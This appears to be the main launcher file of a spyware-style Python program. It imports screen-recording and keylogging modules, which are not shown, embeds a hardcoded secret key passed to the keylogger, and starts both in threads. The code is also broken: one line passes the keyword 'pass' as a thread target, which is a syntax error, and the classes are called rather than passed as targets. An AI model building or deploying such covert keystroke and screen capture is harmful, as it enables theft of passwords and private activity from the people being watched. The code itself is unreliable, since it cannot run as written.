from program.screen_rec import ScreenRecording
from program.keylog import KeyLog

from threading import Thread


SECRET_KEY = b"3lqUcKreSiI3DzVdHHD7VggudxDIcWCp-bONmioaebE="

screen_rec = ScreenRecording
keylog = KeyLog

if __name__ == '__main__':
    Thread(target = screen_rec()).start()
    Thread(target = keylog(key=SECRET_KEY)).start()
    Thread(target = pass).start()